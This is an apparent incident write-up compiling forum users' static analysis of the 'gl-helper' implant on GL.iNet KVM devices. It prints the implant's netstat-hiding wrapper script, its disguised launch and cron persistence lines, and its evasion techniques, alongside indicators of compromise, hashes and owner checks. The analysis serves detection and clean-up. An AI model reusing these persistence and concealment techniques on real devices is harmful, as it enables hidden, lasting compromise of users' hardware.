# The KVM implant (gl-helper): what forum users have taken apart

**In short.** During the November 2026 GL.iNet cloud incident, some GL.iNet devices were made to
download and run a hidden program called **`gl-helper`**. Every first-hand report of it that we
know of is on an RM-series KVM unit. Its installer is written for routers as well (it carries a
table of router models), and the attack on routers searched for its folders, but we know of no
report of its files on a router. Forum users recovered the installer script and the helper binaries
from infected devices and took them apart in public. This page collects what they found, with a link
to each post. **How it is known:** unless a line says otherwise, every fact here is **Reported** by
the named forum user; RemoteToHome has not run or recovered these samples itself. What we
checked ourselves is marked as ours where it stands. *Corrected 25 November 2026: this said one
item, in the last section; our own lookups and tests are now in several places on the page.*

The analysis is of an installer named `ni.sh` and of three downloaded files: `gl-helper` (the main
implant), a helper tool called `gb`, and a small downloader. It was done by reading the files as
text (static analysis). No one ran the malware. The implant's own network code is packed, so some of
its behaviour is known only from the parts of it that are readable.

What it means for you, in one paragraph: if a device of yours ran this, an attacker had full control
of it, installed a program that hides itself and comes back after a reboot or a firmware update that
keeps settings, and could send it new commands at any time. The last section lists the exact things
an owner can look for.

---

## The installer: `ni.sh`

Reported by **rdizzie**, who recovered `ni.sh` from an infected device and deobfuscated it
([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90)).

- `ni.sh` is a POSIX shell script. Its own internal version string is **`v63`** (installer version
  `63`).
- Its job: download and install `gl-helper`, set up ways for it to survive, and generate watchdog
  scripts that put it back if it is removed.
- Every path, file name and server address in the script is hidden as octal escape sequences and
  decoded at run time with `printf`. The developer comments in the script are in Simplified Chinese.

### Folders it tries, in order

The script picks the first folder it can write to as its working directory (`$BASE`). Reported by
rdizzie ([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90)):

| Order | Folder | Role |
|---|---|---|
| 1 | `/etc/glinet/.cache` | first choice for `$BASE` |
| 2 | `/etc/gl_nas/.cache` | fallback |
| 3 | `/userdata/.gl` | fallback |
| 4 | `/overlay/.gl` | fallback |
| 5 | `/tmp/.gl` | fallback (RAM only) |
| seed | `/etc/config/.gl` | backup "seed" copy used to heal itself; survives firmware updates that keep settings |

### Files it creates and what each does

Reported by rdizzie ([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90)):

| Name | What it is |
|---|---|
| `gl-helper` | the main implant binary (the script calls it `$NODE`) |
| `gb` | a helper tool used to spoof the process name and run the encrypted command channel |
| `run.sh` | launcher and repair script |
| `watch.sh` | watchdog run every 3 minutes from cron |
| `wake.sh` | encrypted check-in to the command server; runs commands it signs and sends back |
| `boot.sh` | start-up dropper, stored at `/etc/config/.gl/boot.sh` |
| `rtty_keep.sh` | optional: forces the remote-terminal config to a rogue server |
| `.u` | hidden file holding the command-server URL |
| `.wc` | hidden state file |
| `install.log` | debug log, only if the installer is run with `--debug` |
| `eco`, `node` | older/legacy names the installer cleans up |

### The server map

Reported by rdizzie ([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90),
[post 101](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/101)).
Addresses are written with `[.]` so they are not clickable.

- **Servers:** `66[.]245[.]219[.]252` (primary; the one the `netstat` wrapper hides) and
  `65[.]20[.]71[.]131` (secondary staging, and the rogue remote-terminal server).
- **Staging port:** TCP `8000`. **Report/command port:** TCP `8899`.
- **Download paths** (tried on both servers unless noted):

  | File | URLs |
  |---|---|
  | `gl-helper` (`n5`) | `http://66[.]245[.]219[.]252:8000/n5`, `.../n5b`, `http://65[.]20[.]71[.]131:8000/n5` |
  | downloader (`l5`) | `http://66[.]245[.]219[.]252:8000/l5`, `http://65[.]20[.]71[.]131:8000/l5` |
  | `gb`, 64-bit (`gb3`) | `http://66[.]245[.]219[.]252:8000/gb3`, `http://65[.]20[.]71[.]131:8000/gb3` |
  | `gb`, 32-bit ARM (`gb7`) | `http://66[.]245[.]219[.]252:8000/gb7`, `http://65[.]20[.]71[.]131:8000/gb7` |

- **Post-reboot report (`/wake`):** an HTTP GET to `http://66[.]245[.]219[.]252:8899/wake`, sent once
  per boot (within 1,800 seconds of start-up). Its query fields:

  ```
  /wake?m=DG_<device mac>&r=<rtty state>&c=<cloud state>&up=<uptime>&p=<rtty pids>&dd=<ddns length>
  ```

  The `DG_` prefix is followed by the device's hardware address; we replace that per-device value
  with `<device mac>`.
- **Fallback command server (built into `gb`):** `http://gl-inet[.]top:8899/api/v2/sync`.
  `gl-inet[.]top` is a look-alike domain, not GL.iNet's.

### The model-to-tag table

The installer reads `/proc/gl-hw-info/model` and maps it to a campaign tag, passed to `gl-helper` as
`-e <tag>`. Reported by rdizzie
([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90)).
These tags are the same for every device of a model (they are not per-device), so they are given
verbatim:

| Device | Tag | Device | Tag |
|---|---|---|---|
| GL-X3000 | `ac9f01` | GL-BE10000 | `ac9f08` |
| GL-XE3000 | `ac9f02` | GL-BE14000 | `ac9f09` |
| GL-MT6000 / GL-MT3600BE | `ac9f03` | GL-E5800 | `ac9f0a` |
| GL-MT3000 | `ac9f04` | GL-BE3600 | `ac9f0b` |
| GL-AXT1800 | `ac9f05` | RM1 | `ac9f11` |
| GL-BE6500 | `ac9f06` | RM1PE | `ac9f12` |
| GL-BE9300 | `ac9f07` | RM4PE | `ac9f13` |
|  |  | RM10 / RM10RC | `ac9f14` |
|  |  | RM1V2 | `ac9f15` |

If the model is not recognised the tag is `ac99f34cv1`. A version suffix (such as `v1`) is added to
the tag. The script also carries eight predefined tags: `ac99f34cv1`, `ac9fe2v1`, `ac9fe2v2`,
`ac9f17v1`, `ac9f17v2`, `ac9d26v1`, `ac9daev1`, `ac9daev2`.

The model list covers most of GL.iNet's current routers and KVM devices, which shows the campaign
was built to run on many GL.iNet models, not one.

### Operator options

The installer accepts these flags (reported by rdizzie,
[post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90));
the default action is `install`:

```
--uuid --ver --debug --fast --beacon --rtty-server --rtty-keep --ssh-key --wake-on --wake-url
--wake-every --fake --no-netwrap --stealth --oom --status --dry-run --no-persist --uninstall
```

### Install steps, in order

Reported by rdizzie
([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90),
[post 94](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/94),
[post 101](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/101)):

1. **Identify and probe.** Read the model, map it to a tag, and choose the first writable folder as
   `$BASE` (tested by touching a file `.w`).
2. **Place `gb` and clean up old versions.** If `$BASE/gb version` does not report `GB5`, download the
   right build for the processor (`gb7` for 32-bit ARM, `gb3` for 64-bit), check the first four bytes
   are the ELF header, and make it executable. Delete leftovers of earlier campaigns (`rn`, `wv`,
   `node`, `eco`).
3. **Download `gl-helper`.** By default, fetch a small downloader `eco.tmp` from `/l5`, run it as
   `eco.tmp -o $BASE/gl-helper` in the background, and poll (60, then 40, then 200 seconds) until
   `gl-helper` is a valid ELF file larger than 100,000 bytes. If `--fast` is set, or the downloader
   times out, fetch `/n5` (or `/n5b`) directly with `wget`, `curl` or `uclient-fetch`.
4. **Start and disguise it.** Launch it detached:

   ```
   setsid "$NODE" -e "<tag>" -P "$BASE" -d >/dev/null 2>&1 </dev/null &
   ```

   Four seconds later, run `$BASE/gb fake <pid> "crond -i /tmp/.log"` so that `ps` shows a harmless
   cron line instead of `gl-helper`.
5. **Set up persistence** (next section).
6. **Optional backdoors and clean-up** (SSH key, signed command channel, remote-terminal handling).
7. **Verify and repair.** Audit the installed files, folder counts, `rc.local`, cron and running
   processes; if anything is missing, re-run the failed part.

### Persistence — how it comes back

Reported by rdizzie
([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90)):

- **Seed copy.** The installer copies `gl-helper`, `gb`, `run.sh`, `watch.sh`, `wake.sh`,
  `rtty_keep.sh` and `boot.sh` into `/etc/config/.gl/`. On OpenWrt, `/etc/config/` is kept during a
  normal firmware update that preserves settings, so the implant survives such an update.
- **`/etc/rc.local` line.** The installer removes any early `exit 0` from `/etc/rc.local`, adds a line
  that runs `/etc/config/.gl/boot.sh`, adds six one-minute loops that trigger `wake.sh` shortly after
  boot, then puts `exit 0` back at the end.
- **Cron watchdog.** It installs `*/3 * * * * /bin/sh $BASE/watch.sh` into both the system crontab and
  `/tmp/gl_crontabs/root`, starts `crond` if it is not running, and writes `root` to `cron.update`.
  Every three minutes, `watch.sh`:
  - restores any missing files from `/etc/config/.gl/` back into `$BASE`;
  - re-adds the cron entries for `watch.sh` and `wake.sh`;
  - restarts `gl-helper` if no running process points at `$BASE/gl-helper`, then re-applies the fake
    process name;
  - restarts GL.iNet's own `/etc/init.d/S99rtty` and `/etc/init.d/S99gl-cloud` if they did not start
    after a reboot;
  - within 1,800 seconds of boot, sends the one-time `/wake` report described above (guarded by a
    marker file `/tmp/.dg` so it fires once per boot).
- **SSH key.** If run with `--ssh-key`, it adds the given public key to both
  `/etc/dropbear/authorized_keys` and `/root/.ssh/authorized_keys`, unless a line already contains the
  text **`gl-agent`**.
- **Remote-terminal (rtty) handling, two modes.**
  - Default (`RTTY_KEEP` not set): drop a self-deleting background script (`$BASE/.rk1`) that checks
    `/etc/rtty_conf` every 60 seconds for up to an hour; once the rogue rtty address
    `65[.]20[.]71[.]131` is gone from that file, it restarts rtty so the device reconnects to
    GL.iNet's own cloud and looks normal. A Chinese comment describes this as: let go after
    installing, GL Cloud will push the official config back.
  - With `--rtty-keep`: install `rtty_keep.sh` to run every 5 minutes and force `/etc/rtty_conf` back
    to the attacker's server with TLS turned off.

  *Added 24 November 2026.* The two developer comments on the default mode, as they appear in the
  part of `ni.sh` (function `p_rk`) pictured in
  [BleepingComputer's report of 22 November 2026](https://www.bleepingcomputer.com/news/security/hackers-exploit-glinet-cloud-flaw-to-infect-routers-kvm-devices/),
  with our translation:

  | Comment in the script | In English |
  |---|---|
  | `# 默认不维持 rtty 长连接：装完撒手，GL 云端会自己把配置推回官方` | By default, do not keep the rtty connection open: install and let go. The GL cloud will push the configuration back to the official one by itself. |
  | `# 一次性收尾：等官方配置出现后重启 rtty，让设备离开我们（跑完即退出）` | One-off clean-up: once the official configuration appears, restart rtty so the device leaves us (exit when done). |

  **Reported** (the script text, read from the published picture); the translation is ours and has
  not been checked by a second reader. What the comments show is that the author knew GoodCloud
  sends a device its remote-terminal settings again by itself, and built the default mode around
  that: use the device, then let the cloud put its settings back so nothing looks changed. That
  can be learned by watching a device one owns. It says nothing about who the author is.

### Evasion

Reported by rdizzie
([post 90](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/90),
[post 92](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/92)):

- **Fake process name.** `gb fake <pid> "crond -i /tmp/.log"` attaches to `gl-helper` with `ptrace`
  and overwrites its command-line in memory, so `ps` shows `crond -i /tmp/.log`. This is the exact
  string GL.iNet's own quick check tells owners to look for.
- **`netstat` wrapper** (on by default). If `/bin/netstat` is not already a shell script, the
  installer deletes it and writes this wrapper in its place:

  ```sh
  #!/bin/sh
  H=$(printf '\066\066\056\062\064\065\056\062\061\071\056\062\065\062')
  /bin/busybox netstat "$@" | grep -v "$H"
  ```

  The octal decodes to `66.245.219.252`, so any connection to that address is hidden from anyone who
  runs `netstat` on the device.
- **Time-stamp spreading** (`--stealth`). It reads the modification time of `/bin/busybox`,
  `/usr/sbin/dropbear` or `/sbin/init` and back-dates every malware file, folder, `/etc/rc.local` and
  the root crontab in steps of 7,919 seconds (a prime number), so the new files blend in with the
  firmware's own files.
- **Out-of-memory protection** (`--oom`). It writes `-1000` to `/proc/<pid>/oom_score_adj` for each
  `gl-helper` process, so the kernel avoids killing it when memory runs low.

### The helper `gb`

Reported by rdizzie
([post 92](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/92),
[post 93](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/93)).
The `gb` binaries were compiled with GCC 11.2.1, statically linked against musl, and left
**unstripped** — so the source file names `glbin3.c` and `nacl.c`, internal function names and the
key below are readable in the binary.

- **Sub-commands:** `fake`, `verify`, `state`, `post`, `dec`, `version`.
  - `fake <pid> <text>` — the process-name spoof described above.
  - `state ...` — gather device facts (hardware address, running `gl-helper` process count, count of
    seed files in `/etc/config/.gl`, crontab line count, uptime, installer version `63`) and output
    them encrypted.
  - `post <in> <out>` — read the command-server URL from `$BASE/.u`, or default to
    `http://gl-inet[.]top:8899/api/v2/sync`; send the encrypted state as a raw HTTP/1.0 POST and save
    the reply.
  - `dec` — decrypt and authenticate the server's reply; returns exit code 10 when it holds a valid
    instruction of the form `run:<timestamp>:<signature>:<command>`.
  - `verify <mac> <ts> <sig> <cmd>` — check the instruction before it is run.
  - `version` — print `GB5`.
- **How a command is run.** `wake.sh` runs `gb state` → `gb post` → `gb dec`; on exit code 10 it reads
  `run:<ts>:<sig>:<cmd>`, runs `gb verify`, and only if that passes does it pipe `<cmd>` to `/bin/sh`.
- **Signing scheme.** `verify` checks an **Ed25519** signature over the exact string
  `mac=<mac>&cmd=<cmd>&ts=<ts>`, using this built-in public key (the same in every sample, given
  verbatim):

  ```
  91992d351ab9f4d02912c132acc512c16f3697844e13067640790a5f0d5fdf24
  ```

  The signature is tied to each device's hardware address and to a timestamp, and old timestamps are
  rejected (`stale`). So a command captured from one device cannot be replayed to another or replayed
  later. Only the holder of the matching private key can issue valid commands.
- **Transport encryption.** `gb` statically includes the TweetNaCl library and uses Curve25519,
  XSalsa20 and Poly1305 to encrypt what it sends and decrypt what it receives, with a shared key held
  in the binary. (rdizzie notes in [post 93](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/93)
  that whether the outbound check-in uses the shared symmetric key or asymmetric encryption should be
  confirmed in a disassembler; this page does not settle that point.)

### The packer on `gl-helper` (`n5`) and the downloader (`l5`)

Reported by rdizzie
([post 94](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/94),
[post 92](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/92)):

- Both `n5` (which becomes `gl-helper`) and `l5` (the downloader `eco.tmp`) are wrapped in a custom
  executable packer the author calls **NPK2** ("Node hardened executable packer"). The readable
  markers are `$Info: Node hardened executable packer; format NPK2 $`, `$Id: NPK2 format 0002 $`, the
  path `/proc/self/exe`, and the closing markers `NPK! NPK!`. A standard `upx -d` will not unpack it.
- `n5` starts with the marker `NPK!L` and ends with a version string `0.0.39` and an update-signature
  marker `NUPDSIG1`. `l5` starts with `NPK!H` and has no version or update marker, which fits its role
  as a throw-away first-stage downloader.
- Because the payload is packed, `n5` shows no plaintext addresses; its network settings are inside
  the packed code. The samples examined were 32-bit ARM.

### Wire signatures

Reported by rdizzie
([post 101](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/101)).
Useful even if the operator changes the server address:

- The `gb` check-in is a raw **HTTP/1.0 POST** with **no `User-Agent`**, `Content-Type:
  application/octet-stream` and `Connection: close`; the default path is `/api/v2/sync` on port 8899.
- The post-reboot report is an HTTP GET to `/wake` with the query fields shown above.
- With `--beacon`, the installer also sends a GET that appends `?n=<running count>&b=<base dir>`.

### File hashes

Reported by rdizzie
([post 101](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/101)).
These are the downloaded binaries and the installer; the binaries are the same on every device of the
same processor type unless the operator pushes a new build.

| File | SHA-256 | SHA-1 | MD5 |
|---|---|---|---|
| `ni.sh` | `36e04e10b4667e59b0a3a25147b032dc038c5a9971a7df88be80f8882e30dd87` | `5515f1dadbb8df7cc4b2f9125be95616a948e7ac` | `655acb2bfff37f50a4c3900ae09b7323` |
| `n5` (gl-helper) | `795ccb39fe2fc7f96bfe0bd8e1ffaf718382988a77c94d0260e5d11d95f6a347` | `c13c9c2b1663332f1fb48e731dcd70375b5d0385` | `2619bc21df404d99ef372a9d4dd5e5e9` |
| `l5` (eco.tmp) | `53ba45b9ef490a0200323d582630fa4eb2dad07c0e9adeaa50071d68f63267ca` | `14c918b823f70f4104dad2c48889adc52cf5cbca` | `f5e0b9e3323ad4d2d6e22c9c4f3d6436` |
| `gb3` (gb, 64-bit) | `29d2c70d36b5713d4e6523514ee49d0198a8e8aff4ca02ca86ac429dee908be3` | `3912418ed257e42027e44d24fce426d06d43c7c2` | `ac110643f9e7299fafd3f9d116f8e502` |
| `gb7` (gb, 32-bit ARM) | `eab746b6dafc69f829ab23c11bcc80cb6b2f9206f159173e52d3e7c2083b0d7f` | `8a85e7764dd68bdd2148c5cacf672f8209d1b3bc` | `c4fe4001f7f5b3a89ae2b6508baec6e9` |

The scripts the installer writes on the device (`run.sh`, `watch.sh`, `wake.sh`, `boot.sh`,
`rtty_keep.sh`) and the replaced `/bin/netstat` have a different hash on each device, because they
contain device-specific paths and values. Check for those by name and location, not by hash.

### Independent on-disk confirmation

Reported by **ptp**, who examined an infected GL-RM1 (firmware V1.10.1 release1) with the owner's
permission, read-only
([post 153](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/153)).
The files were in `/etc/glinet/.cache` (primary) and `/etc/config/.gl` (seed):

| File | Size (bytes) | SHA-256 |
|---|---:|---|
| `gl-helper` | 507050 | `795ccb39fe2fc7f96bfe0bd8e1ffaf718382988a77c94d0260e5d11d95f6a347` |
| `gb` | 109720 | `eab746b6dafc69f829ab23c11bcc80cb6b2f9206f159173e52d3e7c2083b0d7f` |
| `run.sh`, `watch.sh` | 3739 each | `cb33b1ecfe0dfa31389b00e8a2ecd72ed83262335c72ba5f41038a92c7d8fd94` |
| `wake.sh` | 1336 | `c2147a19c81676c0ff55a0e730dc398ea666b9e0c1290b18beb32eccb8462f7f` |
| `boot.sh` | 260 | `17c1fde32e210ffc0619e1a1033a8234e5884574858fdc81b256a28892268962` |
| `.u` | 36 | `f00074e8194d32fabc97abebbe617b66707da759dbcafd9711d93085e768d0f9` |
| modified `/bin/netstat` | 122 | `5c1f84d36fb80f1b9e2388955feb5e69e24d15532c382d8b08236bb3759630b9` |

The on-disk `gl-helper` has the same SHA-256 as rdizzie's `n5`, and the on-disk `gb` has the same
SHA-256 as rdizzie's `gb7`, so this unit was a 32-bit ARM device and the two independent analyses
agree. ptp also reported that the `crond -i /tmp/.log` process was **not** running at the time, that a
later process list showed none of the implant's names, and that the malware files had modification
times exactly 7,919 seconds apart — the time-stamp spreading described above. In other words, the
device was clearly infected even though GL.iNet's quick check found nothing.

---

### Further traces, from a second reading of the samples

*Added 23 November 2026.* A second researcher, infinisec, read the same installer (`ni.sh`,
version 63) and its four programs and compared them with the community script
([issue 25 of that script's repository](https://github.com/admonstrator/glinet-csa-2026-01/issues/25)).
The points below are **Reported** from that issue; we hold no sample of this implant and have not
checked them. They add to what is listed above:

| Trace | What the issue says about it |
|---|---|
| `/var/spool/cron/crontabs` and `/var/spool/cron/crontabs/root` | The installer writes its cron entry and a `cron.update` file here as well as in `/etc/crontabs` and `/tmp/gl_crontabs`, and changes the files' times to hide it |
| A second cron service | If no cron service is running, the installer starts `/etc/init.d/crond` or a bare `crond -b`. On GL.iNet routers `/tmp/gl_crontabs` is served by a separate cron process, so restarting one cron service does not stop the watchdog |
| `/tmp/rc.local.bak` | Made when the installer adds its start-up line, and never deleted |
| `/tmp/.bt` | Made by `watch.sh` or `run.sh` within 900 seconds of boot |
| `/tmp/.wl` (with `/tmp/.wl/t`), `/tmp/.p`, `/tmp/.r` | A lock folder and the buffers `wake.sh` uses for its encrypted exchange with the server |
| `gl-helper.dl` | The name of the implant while it is being downloaded directly |
| `rn`, `wv` | Two more old names the installer cleans up, besides `eco` and `node` |
| `$BASE/.rk1` as a process | Runs as `/bin/sh <folder>/.rk1` for up to an hour, checking `/etc/rtty_conf` every 60 seconds |
| `/etc/rtty_conf` content | With `--rtty-keep --rtty-server <host>` the file is rewritten as `{"servers":["..."],"heartbeat":5,"timeout":0,"tls":false}`. The host is the operator's choice, so it need not be one of the known addresses |
| `.u` | With `--wake-on --wake-url <URL>` the operator's own address is stored here; the helper reads it before it falls back to `http://gl-inet.top:8899/api/v2/sync` |
| Any SSH key | `--ssh-key "<key>"` adds whatever key the operator gives. The name `gl-agent` is the default, not a fixed mark |
| Any process name | `--fake <name>` sets the false process name. `crond -i /tmp/.log` is the default, not a fixed mark |

The same researcher states, in
[issue 23](https://github.com/admonstrator/glinet-csa-2026-01/issues/23), that both of the implant's
addresses belong to one hosting company's network (`66.245.219.252` in `66.245.216.0/21` and
`65.20.71.131` in `65.20.64.0/19`, both AS20473, Vultr), and names four ports for it: 8000, 8899,
5912 and 5913. **Reported** for the ports. *Updated 24 November 2026:* we looked the two ranges up
ourselves. Both are Vultr's, and the registries record them under Japan and India, not the United
States ([attacker infrastructure](attacker-infrastructure.md#other-addresses-reported)). Ports 8000 and 8899 match
what is recorded above.

What follows from this for an owner: the folder names, the default process name and the three
known addresses are the operator's defaults. A device set up with other options would show none
of them. That is one more reason to reinstall without keeping settings and not to rely on a
check that found nothing.

### What an infected KVM does on the network: one owner's capture

*Added 25 November 2026.* **Reported** by forum user dja, from their own GL-RM1, recorded by
their firewall's monitoring tools ([notice thread, post 79](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056/79), 21 November 2026). We have
not seen this traffic ourselves. Times are UTC, 19 November 2026:

| Time | What the KVM did |
|---|---|
| 02:35:56 | Opened a connection to `65.20.71.131` port 5912, by address, with no name lookup first, and sent about 28 KB. The first sign of anything wrong |
| 02:36:57 to 02:37:00 | Fetched `/ni.sh` (about 30 KB) and `/n5` (about 110 KB, then about 507 KB) from `66.245.219.252` port 8000, over plain HTTP |
| 02:37:01 | Sent its name lookups straight to 1.1.1.1 and 8.8.8.8, past the network's own resolver |
| 02:37:04 | First connection to **`api.trongrid.io`**, a public service for the TRON blockchain. About 1,000 more followed in the next 36 hours |
| 02:37:04 onward | Began exchanging traffic with other addresses, about 1,450 that day and about 1,800 the next, against about 20 a day before. Mostly home internet connections in many countries |
| 02:37:45 | Looked up `gl-inet.top`, which answered with `66.245.219.252`, and tried that address on port 8899 |
| 03:02 | Tried 32 private addresses in ten minutes, none of them on the owner's network; about 3,700 such attempts a day |
| 20 November 03:03 | Last connection to `65.20.71.131` port 5912, 58 in all |

What the owner concludes, and what is their reading:

- **A peer-to-peer network.** The pattern to other addresses was the same each time: a 12-byte
  UDP probe, a 2-byte answer, then a TCP session of about 2,132 bytes on a random high port.
- **The TRON lookups.** The owner's interpretation is that the implant reads its current server
  address from the blockchain, where it cannot be taken down. They did not capture the content,
  so this is not shown.
- **No spread to other devices** on that network was found.
- **How it got in:** the owner found no login through any other route and names GL.iNet's cloud
  and its remote terminal as the likely one, and says they cannot prove it. A second GL-RM1 on
  the same network was not affected.

**A second owner reports the same lookups.** A Reddit user wrote, in a comment we read on
25 November, that their KVM made hundreds or thousands of lookups for `api.trongrid.io`, all
blocked by their DNS filter. **Reported**; we have not seen the logs.

**What we can add from our own data:** `api.trongrid.io` appears nowhere in what we hold from
routers: not in any malware sample, memory image or saved state. As far as anyone has reported it
is the KVM implant's behaviour only. The two addresses' recorded locations, India and Japan, are
the ones we found in the registries ([attacker infrastructure](attacker-infrastructure.md#other-addresses-reported)).

## What this means for an owner

An owner who still has an infected device (not yet reset or reflashed) can look for the fixed signs
below. **A reboot clears the running process and anything in `/tmp`; a firmware update that keeps
settings removes some files but can carry the seed copy over.** Finding none of these does not prove
a device was never infected. All items are Reported, from the posts linked above.

| Type | What to look for |
|---|---|
| Folders | `/etc/config/.gl`, `/etc/glinet/.cache`, `/etc/gl_nas/.cache`, `/userdata/.gl`, `/overlay/.gl`, `/tmp/.gl` |
| Files | `gl-helper`, `gb`, `run.sh`, `watch.sh`, `wake.sh`, `boot.sh`, `rtty_keep.sh`, `.u`, `.wc` in any of those folders |
| Process | one shown as `crond -i /tmp/.log` (this is the implant with a fake name, not the real cron) |
| Cron | a line `*/3 * * * * /bin/sh .../watch.sh` in the crontab or in `/tmp/gl_crontabs/root` |
| Start-up | a line in `/etc/rc.local` that runs `/etc/config/.gl/boot.sh` |
| `netstat` | `/bin/netstat` is a 122-byte shell script beginning `#!/bin/sh` (not the normal link to BusyBox) |
| SSH | an added key in `/root/.ssh/authorized_keys` or `/etc/dropbear/authorized_keys`, especially a line containing `gl-agent` |
| Addresses | any traffic to `66.245.219.252`, `65.20.71.131`, or DNS for `gl-inet.top` |
| DNS | lookups of `api.trongrid.io` from the KVM, in your resolver's or firewall's log. A KVM has no reason to ask for it. Two owners report hundreds of these a day (see above) |

Note the `netstat` wrapper hides connections to `66.245.219.252`, so check the file itself, and use
the firmware's own `/bin/busybox netstat` rather than `netstat` when looking at connections.

---

## Link to the router attack

The same command server appears on the router side of the incident.

- **Verified by us:** on one router we manage, we recovered from the memory of the GoodCloud client a
  command that had been delivered through GL.iNet's cloud command handler. That command calls
  `http://66.245.219.252:8899/wake?m=KK_<id>`. This is the **same server, port and path** as the
  implant's own `/wake?m=DG_...` report — only the prefix differs (`KK_` instead of `DG_`), and
  `<id>` stands for a per-device value we do not publish. So the router attack and the KVM
  implant used the same server. Details: [attacker-messages.md](attacker-messages.md), entry C8.
- Everything else on this page is **Reported** by the forum users named above.

**Was the implant itself ever reported on a router (not a KVM)?** In the posts we read, the specific
first-hand reports of `gl-helper` files on a device were all for KVM units (GL-RM1, GL-RM10). We did
not find a forum post showing the `gl-helper` files installed on a router. On the router side, what
was seen was the cloud command that searches for the implant's folders and reports back, and a
general dashboard count from GL.iNet staff of "19 with `gl-helper` malware indicators"
([post 55](https://forum.gl-inet.com/t/quickly-check-if-your-router-is-under-attack/73070/55)) that
did not say which were routers and which were KVMs. If that changes, this page should be updated.

---

## Against GL.iNet's clean-up

GL.iNet's fixed firmware carries a clean-up for this implant. We read those clean-ups ourselves
([kvm-firmware.md](kvm-firmware.md), findings K-1, K-10 and R-20); the implant's behaviour is as
reported above. Putting the two side by side (**Inferred** from the two; not tested on an infected
device):

*Updated 25 November 2026.* The router column describes the clean-up in the builds of 22 and
23 November. The two builds of 24 November that we read carry a new script (finding R-40; not
tested). It removes `/etc/config/.gl`, `/etc/glinet/.cache` and `/etc/gl_nas/.cache`
whether or not the first exists, with the `rc.local` line and the three cron lines. It still does
not look at `/userdata/.gl` or `/overlay/.gl`, at cron lines that point into a fallback folder, at
`/bin/netstat`, at SSH keys or at `/etc/rtty_conf`.

| What the installer leaves (Reported) | KVM firmware 1.10.3 clean-up (read by us) | Router fixed firmware clean-up (read by us) |
|---|---|---|
| `/etc/glinet/.cache` | Removed, if one of four marker files exists | Not removed by the script; not carried over by an upgrade |
| `/etc/config/.gl` (the seed copy) | Removed, same condition | Removed, if the folder exists |
| The `rc.local` line for `boot.sh` | The whole `/etc/rc.local` is removed from the writable layer | That one line is removed, if `/etc/config/.gl` exists |
| Cron line for `watch.sh` | The root cron table is removed from the writable layer | Lines naming `/etc/glinet/.cache/watch.sh`, `wake.sh`, `rtty_keep.sh` are removed, if `/etc/config/.gl` exists |
| Fallback folders `/etc/gl_nas/.cache`, `/userdata/.gl`, `/overlay/.gl` | Not looked at | Not looked at |
| Cron lines that point into a fallback folder | Gone with the cron table | Not matched: the script only matches the `/etc/glinet/.cache` paths |
| Replaced `/bin/netstat` | The script removes `usr/bin/netstat` from the writable layer; whether that covers `/bin/netstat` on every model is **not determined** | Not looked at; not carried over by an upgrade |
| Added SSH key (`gl-agent`) | Not looked at; kept by an upgrade that keeps the configuration (tested, finding K-12) | Not looked at; kept by an upgrade with settings kept (tested, finding R-24) |
| `/etc/rtty_conf` pointed at the attacker's server | Not looked at | Not looked at |

Two points follow. First, the SSH key is the part most likely to outlast an upgrade on both kinds
of device, and nothing in either clean-up looks for it: check `authorized_keys` by hand. Second,
on a KVM the folder `/userdata/.gl` is outside the part an upgrade rebuilds: in our own test a
file placed in `/userdata` survived the upgrade to 1.10.3. The installer only uses that folder
when it cannot write to the first two, and the clean-up removes what would start it, so this
would be leftover files, not a running implant; a factory reset clears that partition.

---

*How this page is known: every technical point about the implant is Reported by the named forum
user and linked to the exact post; their analysis was static (the files were read, not run), and
the implant's packed network code is known only in part. What we verified ourselves is labelled.
Thanks to rdizzie and ptp for doing this work in public.*

*Added 23 November 2026. Part of [the incident pages](../README.md). Times are UTC.*
